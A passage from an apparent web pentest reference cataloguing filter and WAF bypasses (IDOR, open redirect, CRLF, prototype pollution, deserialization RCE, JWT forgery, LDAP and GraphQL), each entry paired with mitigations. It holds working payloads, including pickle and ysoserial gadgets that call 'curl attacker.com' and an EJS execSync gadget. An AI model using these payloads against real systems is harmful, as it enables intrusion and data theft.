**Impact:** Filter/WAF bypass enabling HTTP Request Smuggling — front-end/back-end desync (request hijack, cache poisoning)

**Mitigation:** Use HTTP/2 end-to-end; validate during downgrade; reject ambiguous content

**Tools:** Burp Suite (HTTP/2), h2csmuggler

**References:** CWE-444; -&gt;[Request Smuggling checklist](#/checklist/smuggling); James Kettle HTTP/2 research, PortSwigger

---

## FILTER-093 — Direct Object Reference Manipulation
**Test Category:** IDOR · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Authorization

**Where to Test / Injection Point:** object identifier in path/param — behind Server-Side Authorization

**How It Works:** Change resource ID in URL/body to access other users' data

**Detection Method:** Modify sequential/predictable IDs in requests

**Test Steps:** 1. Access own resource: GET /api/user/123/profile 2. Change to GET /api/user/124/profile 3. Check if other user's data returned 4. Try id=1 (admin often first)

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Authorization and reaches the sink — access to another user's object/record

**Payload Example:**

```
GET /api/user/124/profile | GET /api/orders/1001 | POST /api/delete-account {"userId":124}
```

**Why It Works:** Application uses direct reference (database ID) without verifying requesting user owns the resource

**Impact:** Filter/WAF bypass enabling IDOR — access to another user's object/record

**Mitigation:** Implement authorization checks per request; use indirect references (UUIDs); verify ownership server-side

**Tools:** Burp Suite, Autorize extension

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP IDOR, WSTG-ATHZ-04, PortSwigger Access Control

---

## FILTER-094 — GUID/UUID Enumeration via Leaks
**Test Category:** IDOR · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Authorization

**Where to Test / Injection Point:** object identifier in path/param — behind Server-Side Authorization

**How It Works:** Application uses UUIDs but leaks them in other endpoints

**Detection Method:** Search for UUID leaks across application

**Test Steps:** 1. Application uses UUIDs for resource access 2. Search for UUID leaks in: public profiles; API responses; source code; JS files; emails 3. Use leaked UUID to access resources

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Authorization and reaches the sink — access to another user's object/record

**Payload Example:**

```
GET /api/documents/550e8400-e29b-41d4-a716-446655440000 (UUID leaked in another user's public profile or API response)
```

**Why It Works:** UUIDs are unguessable but if leaked elsewhere they provide direct access; security through obscurity fails when reference is exposed

**Impact:** Filter/WAF bypass enabling IDOR — access to another user's object/record

**Mitigation:** Implement authorization checks even with UUIDs; never expose UUIDs of resources user shouldn't access

**Tools:** Burp Suite, JS LinkFinder, gau

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Access Control, Bug bounty writeups

---

## FILTER-095 — HTTP Method-Based IDOR
**Test Category:** IDOR · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Authorization

**Where to Test / Injection Point:** object identifier in path/param — behind Server-Side Authorization

**How It Works:** GET request to resource is authorized but PUT/DELETE to same resource is not checked

**Detection Method:** Test different HTTP methods on same endpoint

**Test Steps:** 1. GET /api/user/123 returns own data (authorized) 2. Try PUT /api/user/124 {"role":"admin"} 3. Try DELETE /api/user/124 4. Check if write/delete operations bypass auth

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Authorization and reaches the sink — access to another user's object/record

**Payload Example:**

```
PUT /api/user/124 {"email":"attacker@evil.com"} | DELETE /api/user/124/documents/1
```

**Why It Works:** Authorization middleware may only check GET requests; PUT/POST/DELETE handlers added later without same auth checks

**Impact:** Filter/WAF bypass enabling IDOR — access to another user's object/record

**Mitigation:** Apply authorization to all HTTP methods uniformly; use consistent authorization middleware

**Tools:** Burp Suite, Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP, PortSwigger Access Control labs

---

## FILTER-096 — Parameter Pollution IDOR
**Test Category:** IDOR · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Authorization

**Where to Test / Injection Point:** object identifier in path/param — behind Server-Side Authorization

**How It Works:** Send multiple ID parameters to confuse authorization check

**Detection Method:** Send duplicate ID parameters with different values

**Test Steps:** 1. App checks first ID for auth: user_id=123 (own) 2. Add second: user_id=123&amp;user_id=456 3. Auth checks first (123=own=OK) but app uses last (456=other)

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Authorization and reaches the sink — access to another user's object/record

**Payload Example:**

```
user_id=123&user_id=456 | POST: {"user_id":"123","user_id":"456"}
```

**Why It Works:** Server processes duplicate parameters differently than authorization middleware; middleware validates first occurrence; app logic uses last

**Impact:** Filter/WAF bypass enabling IDOR — access to another user's object/record

**Mitigation:** Reject duplicate parameters; ensure auth and app logic use same parameter value

**Tools:** Burp Suite

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); HPP + IDOR research, Bug bounty writeups

---

## FILTER-097 — URL Parsing Bypass for Open Redirect
**Test Category:** Open Redirect · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Security Control Bypassed:** Server-Side Allowlist

**Where to Test / Injection Point:** redirect/return/url parameter — behind Server-Side Allowlist

**How It Works:** Server validates redirect URL but URL parser can be confused

**Detection Method:** Try URL parsing ambiguities to bypass validation

**Test Steps:** 1. Redirect only allows target.com 2. Try //attacker.com (protocol-relative) 3. Try /\\attacker.com 4. Try target.com@attacker.com 5. Try target.com.attacker.com

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Allowlist and reaches the sink — victim redirected to attacker site (phishing / OAuth token theft)

**Payload Example:**

```
redirect=//attacker.com | redirect=/\\attacker.com | redirect=https://target.com@attacker.com | redirect=https://attacker.com#target.com | redirect=https://attacker.com?.target.com
```

**Why It Works:** URL parsers interpret @ as userinfo; # as fragment; backslash handling varies; these tricks make URL appear to point to allowed domain but actually redirect to attacker

**Impact:** Filter/WAF bypass enabling Open Redirect — victim redirected to attacker site (phishing / OAuth token theft)

**Mitigation:** Parse URL and validate only the hostname component; use strict allowlist with proper URL parsing

**Tools:** Burp Suite

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger Open Redirect, PayloadsAllTheThings

---

## FILTER-098 — Open Redirect via Data URI
**Test Category:** Open Redirect · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Security Control Bypassed:** Server-Side Allowlist

**Where to Test / Injection Point:** redirect/return/url parameter — behind Server-Side Allowlist

**How It Works:** URL scheme validation allows data: URIs which can contain JavaScript or redirect to attacker page

**Detection Method:** Try data: URI in redirect parameter

**Test Steps:** 1. Test redirect=data:text/html,&lt;script&gt;location='http://attacker.com'&lt;/script&gt; 2. Try base64 encoded version

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Allowlist and reaches the sink — victim redirected to attacker site (phishing / OAuth token theft)

**Payload Example:**

```
redirect=data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cDovL2F0dGFja2VyLmNvbSc8L3NjcmlwdD4=
```

**Why It Works:** data: URIs render inline content; HTML content with JS executes and redirects to attacker; bypass scheme allowlist that doesn't block data:

**Impact:** Filter/WAF bypass enabling Open Redirect — victim redirected to attacker site (phishing / OAuth token theft)

**Mitigation:** Block data: javascript: and other non-http schemes explicitly

**Tools:** Burp Suite

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); OWASP Unvalidated Redirects, PayloadsAllTheThings

---

## FILTER-099 — CRLF via URL Encoding
**Test Category:** CRLF Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Security Control Bypassed:** Server-Side Filter

**Where to Test / Injection Point:** header-reaching parameter — behind Server-Side Filter

**How It Works:** Filter blocks literal CRLF but not URL-encoded versions

**Detection Method:** Try %0d%0a in header injection points

**Test Steps:** 1. Inject %0d%0a in URL parameter reflected in response header 2. Check if new header line created 3. Try injecting Set-Cookie or Location header

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Filter and reaches the sink — header/response splitting (cache poisoning, header injection)

**Payload Example:**

```
GET /page?lang=en%0d%0aSet-Cookie:admin=true%0d%0a | GET /page?url=http://target%0d%0aX-Injected:true
```

**Why It Works:** Some servers decode URL encoding in header values; %0d%0a becomes CRLF which starts new header line

**Impact:** Filter/WAF bypass enabling CRLF Injection — header/response splitting (cache poisoning, header injection)

**Mitigation:** Strip %0d and %0a from header values; use header-safe output functions

**Tools:** Burp Suite, crlfuzz

**References:** CWE-93; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP HTTP Response Splitting, CWE-113

---

## FILTER-100 — CRLF to XSS via Response Splitting
**Test Category:** CRLF Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** WAF

**Where to Test / Injection Point:** header-reaching parameter — behind WAF

**How It Works:** Inject CRLF to split response and inject HTML body with XSS

**Detection Method:** Combine CRLF with double CRLF to inject body

**Test Steps:** 1. Inject %0d%0a%0d%0a to end headers and start body 2. After double CRLF inject HTML/XSS payload 3. Browser renders injected body

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF and reaches the sink — header/response splitting (cache poisoning, header injection)

**Payload Example:**

```
GET /page?q=%0d%0a%0d%0a<script>alert(1)</script>
```

**Why It Works:** Double CRLF ends HTTP headers; content after becomes response body; browser renders injected HTML as part of page

**Impact:** Filter/WAF bypass enabling CRLF Injection — header/response splitting (cache poisoning, header injection)

**Mitigation:** Sanitize all user input reflected in headers; reject CRLF characters

**Tools:** Burp Suite, crlfuzz

**References:** CWE-93; -&gt;[Host Header Injection checklist](#/checklist/hostheader); PortSwigger HTTP Response Splitting

---

## FILTER-101 — Prototype Pollution via JSON Body
**Test Category:** Prototype Pollution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side (Node.js)

**Where to Test / Injection Point:** JSON body keys (__proto__) — behind Server-Side (Node.js)

**How It Works:** Inject __proto__ key in JSON body to pollute Object prototype

**Detection Method:** Send JSON with __proto__ key to API endpoints

**Test Steps:** 1. Send POST with {"__proto__":{"isAdmin":true}} 2. Check if subsequent object operations inherit isAdmin property 3. Try constructor.prototype syntax

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side (Node.js) and reaches the sink — Object prototype is polluted (DoS/authz bypass/RCE gadget)

**Payload Example:**

```
POST {"__proto__":{"isAdmin":true}} | {"constructor":{"prototype":{"isAdmin":true}}} | {"__proto__":{"role":"admin"}}
```

**Why It Works:** JavaScript prototype chain means Object.prototype properties are inherited by all objects; polluting it affects all subsequent object operations

**Impact:** Filter/WAF bypass enabling Prototype Pollution — Object prototype is polluted (DoS/authz bypass/RCE gadget)

**Mitigation:** Use Object.create(null) for user input; use Map instead of plain objects; freeze Object.prototype; validate JSON keys

**Tools:** Burp Suite, server-side-prototype-pollution scanner (Burp extension)

**References:** CWE-1321; -&gt;[Prototype Pollution checklist](#/checklist/prototype); PortSwigger Prototype Pollution labs, PayloadsAllTheThings

---

## FILTER-102 — Prototype Pollution to RCE
**Test Category:** Prototype Pollution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side (Node.js)

**Where to Test / Injection Point:** JSON body keys (__proto__) — behind Server-Side (Node.js)

**How It Works:** Escalate prototype pollution to remote code execution via gadget chains

**Detection Method:** After confirming pollution check for RCE gadgets

**Test Steps:** 1. Confirm prototype pollution exists 2. Identify framework (Express/Handlebars/Pug/EJS) 3. Use known gadget chain for framework 4. Achieve RCE

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side (Node.js) and reaches the sink — Object prototype is polluted (DoS/authz bypass/RCE gadget)

**Payload Example:**

```
For EJS: {"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}} | For Handlebars: {"__proto__":{"type":"Program","body":[{"type":"MustacheStatement",...}]}}
```

**Why It Works:** Template engines and other libraries read prototype properties during rendering; polluted values become part of template compilation which executes code

**Impact:** Filter/WAF bypass enabling Prototype Pollution — Object prototype is polluted (DoS/authz bypass/RCE gadget)

**Mitigation:** Update frameworks; use --frozen-intrinsics flag; use safe merge functions

**Tools:** Burp Suite, ppfuzz, ppmap

**References:** CWE-1321; -&gt;[Prototype Pollution checklist](#/checklist/prototype); PortSwigger PP to RCE, Matan Berson research

---

## FILTER-103 — Client-Side Prototype Pollution to DOM XSS
**Test Category:** Prototype Pollution · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Client-Side

**Where to Test / Injection Point:** JSON body keys (__proto__) — behind Client-Side

**How It Works:** Pollute prototype via URL fragment/query to trigger DOM-based XSS via gadgets

**Detection Method:** Check for CSPP via URL and DOM property access

**Test Steps:** 1. Test: https://target.com/?__proto__[test]=polluted 2. In console: check if ({}).test === 'polluted' 3. Find DOM XSS gadget that reads polluted property 4. Craft XSS

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Client-Side and reaches the sink — Object prototype is polluted (DoS/authz bypass/RCE gadget)

**Payload Example:**

```
https://target.com/?__proto__[innerHTML]=<img/src/onerror=alert(1)> | https://target.com/?__proto__[srcdoc]=<script>alert(1)</script> | https://target.com/#__proto__[transport_url]=data:,alert(1)//
```

**Why It Works:** Client-side JS libraries merge URL parameters into objects unsafely; polluted prototype properties are read by DOM manipulation code (gadgets)

**Impact:** Filter/WAF bypass enabling Prototype Pollution — Object prototype is polluted (DoS/authz bypass/RCE gadget)

**Mitigation:** Use Object.create(null); sanitize URL parameter keys; use hasOwnProperty checks

**Tools:** ppmap, DOM Invader (Burp), browser console

**References:** CWE-1321; -&gt;[Prototype Pollution checklist](#/checklist/prototype); PortSwigger Client-Side PP labs, s1r1us research

---

## FILTER-104 — Java Deserialization RCE
**Test Category:** Deserialization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** WAF/Server-Side Filter

**Where to Test / Injection Point:** serialized object input — behind WAF/Server-Side Filter

**How It Works:** Identify Java serialized objects and exploit known gadget chains for RCE

**Detection Method:** Look for serialized Java objects (starts with ac ed 00 05 or rO0AB base64)

**Test Steps:** 1. Find Java serialized data (cookies/parameters/viewstate) 2. Identify available libraries (Commons Collections/Spring etc.) 3. Generate payload with ysoserial 4. Send payload

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF/Server-Side Filter and reaches the sink — untrusted object is deserialized (RCE)

**Payload Example:**

```
ysoserial: java -jar ysoserial.jar CommonsCollections1 'curl attacker.com' | base64 → replace in cookie/parameter
```

**Why It Works:** Java deserialization instantiates objects and calls methods; gadget chains in common libraries allow arbitrary code execution

**Impact:** Filter/WAF bypass enabling Deserialization — untrusted object is deserialized (RCE)

**Mitigation:** Don't deserialize untrusted data; use allowlist for deserializable classes; use look-ahead deserialization

**Tools:** ysoserial, Burp Java Deserialization Scanner, JexBoss

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); PortSwigger Deserialization labs, OWASP Deserialization

---

## FILTER-105 — PHP Deserialization via phar://
**Test Category:** Deserialization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** WAF/Server-Side Filter

**Where to Test / Injection Point:** serialized object input — behind WAF/Server-Side Filter

**How It Works:** Bypass file operation filters by using phar:// stream wrapper which triggers deserialization

**Detection Method:** Test phar:// wrapper in file inclusion/operation parameters

**Test Steps:** 1. Create malicious phar file with serialized PHP object 2. Upload phar as allowed file type (JPG with phar content) 3. Trigger file operation: file_exists('phar://uploads/evil.jpg') 4. __destruct/__wakeup executes

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF/Server-Side Filter and reaches the sink — untrusted object is deserialized (RCE)

**Payload Example:**

```
file=phar://uploads/evil.jpg/test (triggers deserialization of phar metadata)
```

**Why It Works:** PHP phar:// stream wrapper deserializes metadata when file operation is performed; any file_exists/is_dir/fopen with phar:// triggers it

**Impact:** Filter/WAF bypass enabling Deserialization — untrusted object is deserialized (RCE)

**Mitigation:** Disable phar:// stream wrapper; validate file paths; don't use user input in file operations

**Tools:** PHPGGC, Burp Suite

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); PortSwigger, Sam Thomas phar:// research

---

## FILTER-106 — Python Pickle Deserialization RCE
**Test Category:** Deserialization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** WAF/Server-Side Filter

**Where to Test / Injection Point:** serialized object input — behind WAF/Server-Side Filter

**How It Works:** Identify and exploit Python pickle deserialization for RCE

**Detection Method:** Look for base64-encoded pickle data or pickle content type

**Test Steps:** 1. Find pickle data (often base64 in cookies/tokens) 2. Craft malicious pickle with __reduce__ 3. Encode and submit

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF/Server-Side Filter and reaches the sink — untrusted object is deserialized (RCE)

**Payload Example:**

```
import pickle;import os;class Exploit:__reduce__=lambda self:(os.system,('curl attacker.com',));pickle.dumps(Exploit()) | base64 encoded pickle in cookie
```

**Why It Works:** Python pickle __reduce__ method calls arbitrary functions during deserialization; os.system/subprocess.call enables RCE

**Impact:** Filter/WAF bypass enabling Deserialization — untrusted object is deserialized (RCE)

**Mitigation:** Never unpickle untrusted data; use JSON/YAML for serialization; if pickle needed use hmac signing

**Tools:** Custom Python script, Burp Suite

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); OWASP Deserialization, PayloadsAllTheThings

---

## FILTER-107 — .NET Deserialization (ViewState/TypeNameHandling)
**Test Category:** Deserialization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** WAF/Server-Side Filter

**Where to Test / Injection Point:** serialized object input — behind WAF/Server-Side Filter

**How It Works:** Exploit .NET deserialization via ViewState or JSON with TypeNameHandling

**Detection Method:** Check for ViewState (ASP.NET) or TypeNameHandling in JSON

**Test Steps:** 1. Find __VIEWSTATE parameter or JSON with $type 2. Check if ViewState MAC disabled or key known 3. Generate payload with ysoserial.net 4. Submit

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF/Server-Side Filter and reaches the sink — untrusted object is deserialized (RCE)

**Payload Example:**

```
ysoserial.net: ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c whoami" | ViewState: decode→modify→re-sign if key available
```

**Why It Works:** JSON.NET TypeNameHandling.All deserializes any type; ViewState without MAC validation allows arbitrary object injection

**Impact:** Filter/WAF bypass enabling Deserialization — untrusted object is deserialized (RCE)

**Mitigation:** Set TypeNameHandling.None; enable ViewState MAC validation; validate assembly types

**Tools:** ysoserial.net, Burp ViewState extension, blacklist3r

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); PortSwigger, Alvaro Muñoz &amp; Oleksandr Mirosh research

---

## FILTER-108 — JWT Algorithm None Attack
**Test Category:** JWT · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** No Signature Verification

**Where to Test / Injection Point:** Authorization Bearer JWT — behind No Signature Verification

**How It Works:** Change JWT algorithm to 'none' to bypass signature verification

**Detection Method:** Decode JWT and change alg field to 'none'

**Test Steps:** 1. Decode JWT token (header.payload.signature) 2. Change header: {"alg":"none"} 3. Modify payload claims 4. Remove signature (send header.payload.) 5. Submit

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades No Signature Verification and reaches the sink — token signature/verification is defeated (authN bypass, privilege escalation)

**Payload Example:**

```
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ. (note trailing dot; no signature)
```

**Why It Works:** Some JWT libraries accept 'none' algorithm which requires no signature; server processes unsigned token as valid

**Impact:** Filter/WAF bypass enabling JWT — token signature/verification is defeated (authN bypass, privilege escalation)

**Mitigation:** Explicitly reject 'none' algorithm; require specific algorithm in verification; use allowlist

**Tools:** jwt_tool, jwt.io, Burp JWT extensions

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); PortSwigger JWT labs, Auth0 JWT security

---

## FILTER-109 — JWT HS256 Key Brute Force
**Test Category:** JWT · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Weak Key

**Where to Test / Injection Point:** Authorization Bearer JWT — behind Weak Key

**How It Works:** Brute force weak HMAC secret key used to sign JWT tokens

**Detection Method:** Test if JWT uses HS256 with weak/common secret

**Test Steps:** 1. Capture JWT token 2. Use hashcat/jwt_tool to brute force HS256 secret 3. If secret found: forge arbitrary tokens 4. Sign forged token with discovered secret

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Weak Key and reaches the sink — token signature/verification is defeated (authN bypass, privilege escalation)

**Payload Example:**

```
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt | jwt_tool TOKEN -C -d wordlist.txt
```

**Why It Works:** If HMAC secret is weak (common word/short string); brute force reveals it; attacker can forge any JWT

**Impact:** Filter/WAF bypass enabling JWT — token signature/verification is defeated (authN bypass, privilege escalation)

**Mitigation:** Use strong random secret (256+ bits); use RS256 with key pair instead of HS256

**Tools:** hashcat, jwt_tool, jwt_cracker

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); PortSwigger JWT labs, PayloadsAllTheThings JWT

---

## FILTER-110 — JWT RS256 to HS256 Algorithm Confusion
**Test Category:** JWT · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Algorithm Confusion

**Where to Test / Injection Point:** Authorization Bearer JWT — behind Algorithm Confusion

**How It Works:** Switch algorithm from RS256 to HS256; use public key as HMAC secret to forge tokens

**Detection Method:** Obtain public key and attempt algorithm switch

**Test Steps:** 1. Get server's RSA public key (/jwks.json or /.well-known) 2. Change JWT alg from RS256 to HS256 3. Sign payload using public key as HS256 secret 4. Submit forged token

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Algorithm Confusion and reaches the sink — token signature/verification is defeated (authN bypass, privilege escalation)

**Payload Example:**

```
jwt_tool TOKEN -X k -pk public_key.pem (switches to HS256 using public key)
```

**Why It Works:** Server code verifies(token, publicKey); with HS256 this means HMAC verify using public key as secret; attacker has public key so can sign

**Impact:** Filter/WAF bypass enabling JWT — token signature/verification is defeated (authN bypass, privilege escalation)

**Mitigation:** Specify expected algorithm in verification code; don't let token control algorithm selection

**Tools:** jwt_tool, PyJWT

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); PortSwigger JWT Algorithm Confusion lab, CVE-2016-5431

---

## FILTER-111 — JWT Header JWK Injection
**Test Category:** JWT · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** JWK Injection

**Where to Test / Injection Point:** Authorization Bearer JWT — behind JWK Injection

**How It Works:** Inject attacker's public key in JWT header JWK field; server uses embedded key to verify

**Detection Method:** Check if server trusts JWK embedded in token header

**Test Steps:** 1. Generate RSA key pair 2. Create JWT with jwk header containing attacker's public key 3. Sign with attacker's private key 4. Server extracts JWK from header and verifies

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades JWK Injection and reaches the sink — token signature/verification is defeated (authN bypass, privilege escalation)

**Payload Example:**

```
jwt_tool TOKEN -X i (injects JWK into header)
```

**Why It Works:** Some JWT libraries extract verification key from token's jwk header field; attacker provides their own key pair

**Impact:** Filter/WAF bypass enabling JWT — token signature/verification is defeated (authN bypass, privilege escalation)

**Mitigation:** Never trust keys embedded in tokens; use server-side key store; pin expected keys

**Tools:** jwt_tool, mkjwk.org

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); PortSwigger JWT JWK injection lab

---

## FILTER-112 — LDAP Injection - Auth Bypass
**Test Category:** LDAP Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side Filter

**Where to Test / Injection Point:** LDAP-reaching field — behind Server-Side Filter

**How It Works:** Inject LDAP filter syntax to bypass authentication

**Detection Method:** Test LDAP special characters in login fields

**Test Steps:** 1. Try username: * (wildcard) 2. Try username: admin)(|(password=*) 3. Try username: admin)(&amp;)) 4. Check for login bypass

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Filter and reaches the sink — LDAP filter injection (authN bypass, directory disclosure)

**Payload Example:**

```
username=*&password=* | username=admin)(&)&password=anything | username=admin)(|(uid=*)&password=anything
```

**Why It Works:** LDAP filters use (attribute=value) syntax; injecting ) and ( modifies filter logic; )(|(password=*) creates always-true OR condition

**Impact:** Filter/WAF bypass enabling LDAP Injection — LDAP filter injection (authN bypass, directory disclosure)

**Mitigation:** Use parameterized LDAP queries; escape LDAP special characters (RFC 4515); validate input strictly

**Tools:** Burp Suite, ldapsearch

**References:** CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection, WSTG-INPV-06, PayloadsAllTheThings

---

## FILTER-113 — LDAP Injection - Data Exfiltration
**Test Category:** LDAP Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Filter

**Where to Test / Injection Point:** LDAP-reaching field — behind Server-Side Filter

**How It Works:** Extract directory data through manipulated LDAP queries

**Detection Method:** Inject LDAP filter operators to enumerate attributes

**Test Steps:** 1. Try *(|(objectClass=*)) to return all objects 2. Try injecting into search filter to access other OUs 3. Use boolean blind LDAP extraction

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Filter and reaches the sink — LDAP filter injection (authN bypass, directory disclosure)

**Payload Example:**

```
search=*)(uid=*))(|(uid=* | filter=admin)(|(objectclass=*) | attr=*)(uid=admin
```

**Why It Works:** LDAP wildcard * matches all values; modifying filter with OR conditions returns additional directory entries

**Impact:** Filter/WAF bypass enabling LDAP Injection — LDAP filter injection (authN bypass, directory disclosure)

**Mitigation:** Escape LDAP special characters; use parameterized queries; implement least-privilege LDAP binds

**Tools:** Burp Suite, ldapsearch, custom scripts

**References:** CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection, PayloadsAllTheThings

---

## FILTER-114 — GraphQL Introspection Abuse
**Test Category:** GraphQL · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Security Control Bypassed:** Server-Side

**Where to Test / Injection Point:** GraphQL query/mutation — behind Server-Side

**How It Works:** Query GraphQL schema to discover all types fields mutations - reconnaissance for further attacks

**Detection Method:** Send introspection query to GraphQL endpoint

**Test Steps:** 1. Send introspection query: {__schema{types{name fields{name}}}} 2. Map all types and fields 3. Identify sensitive fields/mutations 4. Test access controls on each

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side and reaches the sink — GraphQL control bypass (introspection/batching/BOLA, data exposure)

**Payload Example:**

```
POST {"query":"{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind}}}}}"}
```

**Why It Works:** GraphQL introspection exposes complete API schema; attackers discover hidden queries/mutations/fields not shown in UI

**Impact:** Filter/WAF bypass enabling GraphQL — GraphQL control bypass (introspection/batching/BOLA, data exposure)

**Mitigation:** Disable introspection in production; implement field-level authorization

**Tools:** InQL Scanner, GraphQL Voyager, Burp Suite, Altair

**References:** CWE-200; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger GraphQL labs, HackerOne GraphQL reports

---

## FILTER-115 — GraphQL Authorization Bypass via Aliases
**Test Category:** GraphQL · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Authorization

**Where to Test / Injection Point:** GraphQL query/mutation — behind Server-Side Authorization

**How It Works:** Use GraphQL aliases to access unauthorized fields or bypass rate limiting

**Detection Method:** Use aliases to request same field with different arguments

**Test Steps:** 1. Direct query to admin data fails 2. Use alias: { me: user(id:1){name} admin: user(id:0){name role secret} } 3. Check if alias bypasses per-query auth

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Authorization and reaches the sink — GraphQL control bypass (introspection/batching/BOLA, data exposure)

**Payload Example:**

```
{ own: user(id:123) { name } other: user(id:1) { name email role } admin: user(id:0) { name password_hash } }
```

**Why It Works:** Authorization may be checked on the query type level but aliases allow multiple resolutions of same type with different args in single query

**Impact:** Filter/WAF bypass enabling GraphQL — GraphQL control bypass (introspection/batching/BOLA, data exposure)

**Mitigation:** Implement resolver-level authorization; check permissions per field resolution not per query

